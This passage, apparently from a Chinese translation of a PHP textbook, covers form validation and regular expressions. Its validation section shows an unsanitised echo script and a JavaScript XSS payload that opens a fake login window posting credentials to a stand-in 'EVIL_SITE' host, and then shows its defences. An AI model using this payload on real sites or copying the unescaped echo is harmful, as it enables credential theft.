  \ |\n| %W | 以周一为第一天的年份周数。 |\n| %w | 星期几的数字，星期日为 0。 |\n| %x | 当前区域设置的首选日期表示（不含时间）。\
  \ |\n| %X | 当前区域设置的首选时间表示（不含日期）。 |\n| %y | 不含世纪的年份数字（范围 00-99）。 |\n| %Y | 包含世纪的年份数字。\
  \ |\n| %Z | 时区名称或缩写。 |\n| %% | 字面量 %字符。 |\n\n字符串\n\n129\n\n**验证用户字符串数据**\n\n在学习了如何编写管理字符串的代码后，是时候通过实际工作来尝试一下了。我们将查看的真实示例是简单的表单验证。\n\
  \n所有向用户提供服务的 Web 应用程序都会与用户交互。以在线公告板系统（BBS）为例，程序的完全目的是促进用户之间的通信。用户提交公告帖子，大多数情况下使用\
  \ HTML 表单。提交的数据是文本的，偶尔会有二进制附件。\n\n\n\n\n在一个公开的网站上，允许将任意 JavaScript 输入到文本中，并随后将其发送给软件的其他用户，是不可接受的。考虑以下一个公告板消息输入脚本以及一个将消息保存到数据库的脚本。在列表\
  \ 5.6 和 5.7 中，数据并不会实际存储在数据库中，只是被回显，以便可以看到允许任何数据进入系统后的直接影响。\n\n### 列表 5.6：输入公告板消息\
  \ (bb_message.php)\n\n```html\n<html>\n<head>\n<title>BB Message Screen</title>\n\
  **130**\n# 第 5 章\n## 字符串与数组\n</head>\n<body bgcolor=\"#ffff99\"> own<div align=\"\
  center\">Mastering PHP BB Example/</div>\n<form action=\"bb_save_message.php\" method=\"\
  post\">\n<div align=\"left\">\nUsername:\n<input name=\"user_name\" type=\"text\"\
  \ size=\"12\" value=\"\" />\n</div>\n<div align=\"left\">\nMessage: <br />\n<textarea\
  \ cols=\"40\" rows=\"6\" name=\"message\"></textarea>\n</div>\n<div align=\"left\"\
  >\n<input type=\"submit\" value=\"Save Message\" />\n</div>\n</form>\n</body>\n\
  </html></html>\n```\n\n### 列表 5.7：回显公告板消息 (bb_save_message.php)\n\n```php\n<?php\n\
  $post_vars = $HTTP_POST_VARS;\n$user_name = $post_vars[\"user_name\"];\n$message\
  \ = $post_vars[\"message\"];\n?>\n<html>\n<head>\n<title>BB Message Screen</title>\n\
  </head>\n<body bgcolor=\"#ffff99\">\n<div align=\"center\">\nMastering PHP BB Example\
  \ 2\n</div>\n<div align=\"left\">\n<strong>Username:</strong> <?php print($user_name);\
  \ ?>\n</div>\n<div align=\"left\">\n<strong>Message:</strong> <?php print($message);\
  \ ?>\n</div>\n</body>\n</html>\n```\n\n字符串\n**131**\n\n这两个脚本并没有任何高级的操作。列表 5.6 向另一个脚本发布或提交了一个表单。该目标脚本（列表\
  \ 5.7）将数据回显。第二个脚本中的前几行 PHP 确保了无法 GET 变量（通常通过 URL 或 GET 提交的表单传递）。这几行代码是一个小小的安全网，防止了大多数用户篡改\
  \ URL 并导致错误或尝试任何其他不当行为，但它们并没有真正提供多少安全性。\n\n#### 恶意信息\n\n考虑一个将列表 5.8 中的文本作为其消息输入的用户。\n\
  \n### 列表 5.8：恶意用户数据输入\n\n```javascript\n<script language=\"JavaScript\">\nnewWindow\
  \ = window.open(\"about:blank\", \"\",\n\"scrollbars=no,width=320,height=240\");\n\
  winContent = newWindow.document;\nhtmlPage = \"<<html>\\n\"\n+ \"<head>\\n\"\n+\
  \ \"</head>\\n\"\n+ \"<body>\\n\"\n+ \"Bulletin Board Login<br />\\n\"\n+ \"<form\
  \ action=\\\"http://EVIL_SITE/steal_data.pl\\\"\"\n+ \" method=\\\"post\\\"><br\
  \ />\\n\"\n+ \"Username: <input type=\\\"text\\\" name=\\\"username\\\" size=\\\"\
  10\\\" />\"\n+ \"<br />\\n\"\n+ \"Password: <input type=\\\"password\\\"\"\n+ \"\
  \ name=\\\"password\\\" size=\\\"10\\\" /><br />\\n\"\n+ \"<input type=\\\"submit\\\
  \" value=\\\"Login\\\" /><br />\\n\"\n+ \"</form>\\n\"\n+ \"</body>\\n\"\n+ \"</html>\\\
  n\"\nwinContent.open();\nwinContent.write(htmlPage);\nwinContent.close();\n</script>\n\
  ```\n\n列表 5.8 中的代码是 JavaScript，它创建一个新窗口并向用户展示登录表单。图 5.1 展示了毫无防备的用户可能通过这种 JavaScript\
  \ 看到的内容。这是一种社交工程，可用于欺骗毫无防备的用户输入数据并将其发送给完全陌生的实体，只因为在用户看来，该 HTML/脚本来自一个受信任的源。\n\n\
  ![Image 14](img/index-157_1.jpg)\n\n**JavaScript 漏洞**\n\n另一个简单且同样危险的例子是以下代码段：\n\n\
  ```javascript\n<script language=\"JavaScript\">\nnewWindow = window.open(\"http://EVIL_SITE/steal_data.html\"\
  , \"\",\n\"scrollbars=no,width=320,height=240\");\n</script>\n```\n\n在这个示例中，JavaScript\
  \ 打开一个窗口并使用一个完全陌生的网站加载 HTML。此 HTML 可以被定制，看起来和感觉上被攻击网站的其他部分完全一致。用户会看到一个看起来与网站其他部分相同的弹出窗口，这使得用户更容易受到攻击。\n\
  \n必须考虑的最后一个问题是 JavaScript 在页面上下文中执行的。伤害已经造成了。\n\n#### 预防有害数据\n\n如果我们无法控制来源，如何防止这类攻击呢？像互联网的数据必须经过验证和清洗。将\
  \ `bb_save_message.php` 的前几行修改为：\n\n```php\n<?php\n$post_vars = $HTTP_POST_VARS;\n\
  $user_name = $post_vars[\"user_name\"];\n$message = $post_vars[\"message\"];\n$allowed_tags\
  \ = \"<br><b>\";\n$message = strip_tags($message, $allowed_tags);\n?>\n```\n\n`strip_tags()`\
  \ 函数接收字符串作为参数，并移除第二个参数中列出的所有 HTML 标签。它返回一个字符串。\n\n那么 `htmlspecialchars()` 呢？让我们使用此代码重新检查\
  \ 5.7 的前几行：\n\n```php\n<?php\n$post_vars = $HTTP_POST_VARS;\n$user_name = $post_vars[\"\
  user_name\"];\n$message = $post_vars[\"message\"];\n$message = htmlspecialchars($message,\
  \ ENT_QUOTES);\n?>\n```\n\n此代码段现在显示用户输入的内容。\n\n### 列表 5.9：转义后的用户输入\n\n```javascript\n\
  <script language=\"JavaScript\">\nnewWindow = window.open(\"about:blank\", \"\"\
  ,\n\"scrollbars=no,width=320,height=240\");\nwinContent = newWindow.document;\n\
  htmlPage = \"<<html>\\n\"\n+ \"<head>\\n\"\n+ \"</head>\\n\"\n+ \"<body>\\n\"\n\
  + \"Bulletin Board Login<br />\\n\"\n+ \"<form action=\\\"http://EVIL_SITE/steal_data.pl\\\
  \"\"\n+ \" method=\\\"post\\\"><br />\\n\"\n+ \"Username: <input type=\\\"text\\\
  \" name=\\\"username\\\" size=\\\"10\\\" />\"\n+ \"<br />\\n\"\n+ \"Password: <input\
  \ type=\\\"password\\\"\"\n+ \" name=\\\"password\\\" size=\\\"10\\\" /><br />\\\
  n\"\n+ \"<input type=\\\"submit\\\" value=\\\"Login\\\" /><br />\\n\"\n+ \"</form>\\\
  n\"\n+ \"</body>\\n\"\n+ \"</html>\\n\"\nwinContent.open();\nwinContent.write(htmlPage);\n\
  winContent.close();\n</script>\n```\n\n\n\n\n\n正则表达式是一种经常令人畏惧但极其强大的文本处理范式。它们能做的事情应该让你、你的家人和朋友感到惊讶——好吧，也许不是你的家人和朋友。但正则表达式就像是一种可以用单行文本表示的小型编程语言。如果你需要一个工具来对文本进行拆解和破坏，没有比正则表达式更合适的了。\n\
  \n> **提示**：> `regular expression`（正则表达式）这个词通常被缩写为 `RE` 或 `regex`。\n\n正则表达式是它们自己的微型语言——专门为描述文本中的模式而设计。尽管它们极其简洁，但正则表达式有一套自己的语法和规则，这一事实使其变得非常灵活且强大。在最抽象的层面上，正则表达式由普通字符（字母\
  \ `a,`、逗号、数字等）和元字符（如星号、括号等）组成，它们组合在一起形成对文本模式的程序化描述。因此，正则表达式允许你匹配文本中的模式和子模式——例如，你可以找到单词\
  \ `antidisestablishmentarianism` 中的每一个元音，从一个 邮箱地址中提取用户名部分，或者找到网页内容中的所有超链接。\n\nPHP\
  \ 提供了两种口味的正则表达式，它们彼此相似，但存在一些细微且关键的区别。这两种口味被称为“POSIX 扩展”正则表达式和“Perl 兼容”正则表达式（通常缩写为\
  \ `PCRE`）。它们的语法略有不同，尽管每种风格的基础构建块是相同的。在本节中，我们将描述如何使用 Perl 兼容的正则表达式，它更强大，而且是二进制安全的（这意味着你可以使用它们来处理二进制数据，也可以处理文本）。你可以在下处找到\
  \ POSIX 扩展正则表达式的描述：\n\n`http://www.php.net/manual/en/ref.regex.php`\n\n一旦你掌握了 Perl\
  \ 兼容的正则表达式，使用 POSIX 扩展版本应该是易事的。\n\n学会如何构造正则表达式是一项非常通用的技能。它们存在于许多语言中甚至是 `JavaScript`，一个训练有过的正则表达式使用者在日常编程中就拥有一把无价的武器。\n\
  \n# 字符串 STRINGS\n\n**135**\n\n一旦学会了如何使用正则表达式，你就会发现它们对于许多任务是不可缺的。\n\n它们扮演的最重要且实用的角色之一是数据验证。使用\
  \ `regexes` 执行简单的数据验证非常容易，可以确保从互联网接收的任何数据都经过了正确的格式化和验证。\n\n在进入细节之前，值得提到的是正则表达式是一个令人生畏的话题，即使对于专家程序员也是如此。这个主题非常庞大，有整本书都在写这个主题。我们希望分享这些工具的力量，揭示其中一些更有用的技巧，并鼓励进一步探索正则表达式的世界。\n\
  \n> **提示**：> 有关正则表达式的更全面覆盖和更高级的正则应用，请查看 Jeffrey Friedl 写的书籍《Mastering Regular Expressions》（O’Reilly,\
  \ 1997）。\n\n## 正则基础 Regex Basics\n\n正则表达式用于在文本中查找模式。正则表达式的两端由特殊的定界符括起来，通常是斜杠（`/`）。正则表达式内部有两个重要的字符类型：普通字符和\
  \ `metacharacters`（元字符）。如果我们使用不带元字符的 `regex`，模式只是纯文本搜索；同样的效果可以通过 `strstr()` 函数实现，而无需求助于正则表达式。通过使用元字符，我们可以将字符（以及其他元字符）组合更复杂的\
  \ `expressions`（表达式），它们将匹配各种复杂的模式。\n\n每个正则表达式都由表达式组成，这些可以是简单的单个字符，也可以是包含多级子表达式的极其复杂的结构。\n\
  \n例如，`regex` `/cat/` 将匹配字符串 `cat`；这是一个不使用元字符的正则表达式示例。相反，`regex` `/\\[cat\\]` 使用了元字符\
  \ `\\[` 和 `\\]`，并将执行更复杂的任务：匹配字符串 `c,`、字符串 `a,` 或字符串 `t`。（结构 `\\[xyz\\]` 被称为 `character\
  \ class`（字符类）；这些类稍后会详细描述）。这是基础常识，但值得说明：正则表达式中的任何普通字符都匹配其自身。`regex` 中的 `P` 匹配字符串中的\
  \ `P`。此类匹配默认情况下是大小敏感的。\n\n重要的元字符在表 5.6 中列出并定义。我们在后续章节中遇到这些字符时，我们将详细介绍它们的功能。\n\n\
  **表 5.6:** 正则元字符 Regex Metacharacters\n\n| 元字符 | 名称 | 描述 |\n| :--- | :--- | :---\
  \ |\n| `\\\\` | 反斜杠 | 转义字符；导致元字符被视为字面量，因此 `\\\\\\|` 实际上将匹配输入中的管道字符；还会导致普通字符被视为特殊字符（例如，`\\\
  \\t` 将匹配制表符，而不是字母 `t`）。 |\n| `\\|` | 管道 | 意味着“匹配其中之一；”例如，`cat\\|dog` 匹配 `cat` 或\
  \ `dog`。 |\n| `()` | 左、右括号 | 将字符、元字符和子表达式组合成括号组；例如 `(foo\\|bar)baz` 将匹配 `foo` 或\
  \ `bar`，随后是 `baz`。 |\n\n**136**\n\n# 第 5 章 字符串与数组 STRINGS AND ARRAYS\n\n**表 5.6:**\
  \ 正则元字符 Regex Metacharacters（续表）\n\n| 元字符 | 名称 | 描述 |\n| :--- | :--- | :--- |\n\
  | `\\[ \\]` | 中括号 | 创建一个字符类，匹配括号内的任意字符（或表达式）；例如 `\\[xyz\\]` 将匹配字母 `x, y` 或 `z`。\
  \ |\n| `{ }` | 花括号 | 定义前一个表达式的最小/最大匹配次数；例如，`a{2,4}` 将匹配字符串 `aa,*` `aaa,*` 和 `aaaa`。\
  \ |\n| `^` | 脱字符符号 | 匹配行的开头（如果 `^` 是字符类中的第一个字符，则意味着“匹配不在该字符类中的字符”）。 |\n| `$` | 符号\
  \ | 匹配行的结尾。 |\n| `\\*` | 星号 | 匹配零或多个前一个表达式。 |\n| `?` | 问号 | 匹配零或一个前一个表达式。 |\n| `+`\
  \ | 加号 | 匹配一个或多个前一个表达式。 |\n| `.` | 点 | 匹配任意字符。 |\n\n元字符在正则表达式中不视为普通字符。如果你希望这些字符之一作为字面量使用，必须在它们前面*转义*（即加上一个反斜杠）。换句话说，为了找到点，你需要在模式中搜索\
  \ `\\.`。\n\n如前所述，正则表达式通常包含在斜杠内（即正斜杠），正则表达式的开头一个，结尾一个（虽然你可以使用任何字符作为定界符，/ 只是一种常见的约定）。所以一个非常基本的正则表达式是\
  \ /PHP/。\n\n好了，说多了，让我们用正则表达式吧！\n\n### 匹配正则模式：preg_match()\n\n`preg_match()` 函数用于匹配正则表达式模式。如果指定\
  \ `matches` 数组作为函数的第三个可选参数，匹配项将填充到指定的数组中。\n\nint preg_match(string pattern, string\
  \ subject [, array matches]) 使用后，作为第三个参数传递的数组将包含关于匹配的相应数据。`$matches[0]` 包含匹配模式的完整文本。`$matches[1]`\
  \ 包含匹配的括号子模式——如果你还不确定那是什么，别担心；它在本章稍晚会会解释。\n\n`preg_match()` 的一个简单用法如下：\n\n```php\n\
  <?php\n$string = \"PHP is the greatest web scripting language\";\n$pattern = \"\
  /PHP/\";\n\nif(preg_match($pattern, $string))\nprint(\"Found a match!\");\n\n?>\n\
  ```\n\n\n\n\n由于字符串包含了字母序列 `PHP`，因此模式匹配成功。\n\n### 锚定匹配 (Anchoring a Match)\n\n脱字符符号\
  \ `^` 是两个 `anchor`（锚定）元字符之一。该元字符强制正则表达式匹配出现在行首的字符。为了让正则 `/^PHP/` 成功在字符串中找到匹配项，字母\
  \ `PHP` 必须位于行的开头。\n\n这些字母后面紧跟什么并不重要，只要前三个字母是 `PHP` 即可。让我们快速看看这在代码中的形式：\n\n```php\n\
  <?php\n$string = “PHP is the greatest web scripting language”;\n$pattern = “/^PHP/”;\n\
  \nif(preg_match($pattern, $string))\n    print(“Found a match!”);\n?>\n```\n\n由于字符串有一个“行开头”后跟着字母\
  \ `PHP`，因此模式匹配成功。如果 `$string` 被设置为“I think PHP is the greatest web scripting language”，那么比较将失败。\n\
  \n美元符号 (`$`) 元字符将模式锚定在行的 `end`（末尾）（或字符串的末尾）：\n\n```php\n<?php\n$string = “The greatest\
  \ web scripting language is PHP”;\n$pattern = “/PHP$/”;\n\nif(preg_match($pattern,\
  \ $string))\n    print(“Found a match!”);\n?>\n```\n\n字符串匹配成功，是因为我们有 `PHP` 然后紧是行尾。\n\
  \n这两个元字符用于锚定任何模式。当然，它们可以结合使用，以确保模式同时锚定在行的开头和末尾：\n\n```php\n<?php\n$pattern = “/^PHP$/”;\n\
  $string = “PHP”;\n\nif(preg_match($pattern, $string))\n    print(“Found a match!”);\n\
  \n$string = “PHP is the best web scripting language”;\nif(preg_match($pattern, $string))\n\
  \    print(“This line won’t print!”);\n?>\n```\n\n**138**\n\n# 第 5 章\n\n## 字符串与数组\
  \ (STRINGS AND ARRAYS)\n\n只有第一个 `preg_match()` 会实际匹配。第二个测试模式的字符串失败了，因为字符串没有在第二个\
  \ `P` 之后结束。\n\n### 匹配单个字符 (Matching a Single Character)\n\n正如前面提到的，最基本的正则表达式是匹配自身的单个字符，例如表达式\
  \ `PHP` 中的字母 `P`。另一个非常有用的元字符是点 (`.`)。点意味着“匹配除换行符外的任何字符”。这里是点的实际应用：\n\n```php\n<?php\n\
  $string = “There are many scripting languages. PJP is great!”;\n$pattern = “/P.P/”;\n\
  \nif(preg_match($pattern, $string))\n    print(“Found a match!”);\n?>\n```\n\n这段代码确实找到了匹配项。它找到了\
  \ `P`，然后是任意字符，最后是另一个 `P`，从而满足了提供给 `preg_match()` 的模式。\n\n正则表达式开始变得越来越有用了，但我们才刚刚开始。\n\
  \n### 匹配字符类 (Matching Character Classes)\n\n`character class`（字符类）就像正则表达式内部的一种种微型语言。这种微型语言表示匹配位于方括号\
  \ `\\[ \\]` 内部定义组中的任意一个字符。字符类括号最简单的用法是当你想要查找两个字符中任选其一的字符串时：模式 `/c\\[oa\\]/` 会同时匹配\
  \ `cat` 和 `cot`。\n\n字符类内部的元字符集与正则表达式中常用的列表略有不同。类内部最重要的元字符之一是连字符 (`-`)，它表示字符范围，因此被称为\
  \ `range delimiter`（范围分隔符）。我们可以在字符类中指定字符范围，例如使用 `\\[0-9\\]` 而不是 `\\[0123456789\\\
  ]`。\n\n*提示*\n\n为了在字符类内部匹配连字符（或连字符），请用反斜杠对其进行转义：`\\[a-z\\\\-\\]` 将匹配任何小写字母或连字符。\n\
  \n字符类可以包含多个范围。如果我们只想匹配字母和数字，可以使用以下字符类：`\\[a-zA-Z0-9\\]`。\n\n假设我们想匹配字符集中任意 `not`（不在）的某个字符。在字符类内部，脱字符符号代表\
  \ `negated`（取反）字符类（而不是它在正则中通常表示“行首”）。\n\n```php\n<?php\n$string = “I don’t like\
  \ numbers 42”;\n$pattern = “/\\[⁰-9\\]$/”;\n\nif(preg_match($pattern, $string))\n\
  \    print(“Found a match!”);\n?>\n```\n\n字符串 (STRINGS)\n\n**139**\n\n上述模式应该与给定字符串匹配吗？答案是否定的，因为我们指定的模式是“匹配任意\
  \ `not` 0–9 且 `is` 跟着字符串末尾的字符”。如果移除脱字符符号，模式将匹配，因为 2 在 0–9 字符类中。\n\n用于取反字符类的脱字符符号必须是类中的第一个字符，否则它在类内部的特殊取反含义就会丢失，被视为普通字符。因此，正则\
  \ `/\\[a-zA-Z⁰-9\\]/` 将匹配任何字母数字字符或 `^` 字符。\n\n### 交替匹配 (Alternating Matches)\n\n\
  假设我们想知道一个字符串是否包含 `cat` 或 `dog` 序列之一。这看起来用字符类应该很容易的：\n\n\n\n\n你可能已经注意到，在此之前正则表达式中的所有内容都是区分大小写的。通常情况下，正则表达式需要是不区分大小写的，以便能够方便地筛选数据。虽然使用字符类（如\
  \ `\\[Cc\\]\\[aA\\]\\[Tt\\]）足够简单，但直接告诉 `preg_match()` 忽略大小写要容易得多。在我们的表达式中，这是通过在结束要匹配模式的正斜杠后添加一个\
  \ `i` 来完成的：`/cat/i`。此表达式匹配 `cat,` 的任何可能的大小写组合，例如 `CaT` 或 `cAt` 或 `CAt`。这在验证用户数据时经常使用。\n\
  \n#### 注意事项\n当正则表达式出现在引号内时（例如在赋值中），这个不区分大小写的标志 `i` 也会进入引号内部：`$pattern = “/cat/i”`。\n\
  \n## 分组模式\n\n当你需要类似“三个这个东西，后面跟着一个连字符，然后是四个那个东西”时（即一个不带区号的北美电话号码），分组模式是非常用的。这种组在正则表达式中由三个元字符构建而成：星号（`*`）、问号（`?`）和加号（`+`）。如之前在表\
  \ 5.6 中描述，星号意味着“匹配前一个字符的零或多个”。问号意味着“零或一个；”加号意味着“一个或多个”。\n\n#### 注意事项\n与放在前面的转义反斜杠不同，分组字符被放在它们所修改的字符之后。\n\
  \n以下是每个分组元字符的示例：\n\n◆ `/ca\\*t/` 匹配字母 `c,`，后面跟着任意数量的字母 `a`（包括完全没有字母 `a`），然后是一个 `t`：`cat,\
  \ ct, caaat.`。\n\n◆ `/ca?t/` 匹配字母 `c,`，后面跟着一个字母 `a` 和一个 `t`，或者直接紧跟着一个 `t`：`cat`\
  \ 或 `ct,`，但不是 `caaat.`。\n\n◆ `/ca+t/` 匹配字母 `c,`，后面跟着任意数量的字母 `a`，然后是一个 `t`：`cat,\
  \ caaat,` 和 `caaaaaaaat,`，但不是 `ct.`。\n\n### 字符串 141\n除了适用于单个字符外，这些分组模式还可以应用于任何子表达式（即表达式中任何带括号的片段）。可以通过输入\
  \ `/(wow)+` 来指示你想查找单词 `wow`，无论它连续出现多少次。\n\n## 预定义字符和字符类\n\n一些非常常见的字符类以及一些不寻常的特殊字符分配了它们自己的“短语”，以便在正则表达式中使用。例如，与其输入字符类\
  \ `\\[0-9\\]`，我们可以使用预定义的、带反斜杠的字符 `\\d` 来指定“任意数字”。有很多预定义字符可以这样使用。表 5.7 中的带反斜杠的字母表示特殊字符或类。\n\
  \n**表 5.7：预定义字符和类**\n\n| 字符 | 含义 |\n| :--- | :--- |\n| `\\a` | 蜂鸣声 |\n| `\\n` |\
  \ 换行符 |\n| `\\r` | 回车 |\n| `\\t` | 制表符 |\n| `\\f` | 换页符 |\n| `\\e` | 转义 |\n| `\\\
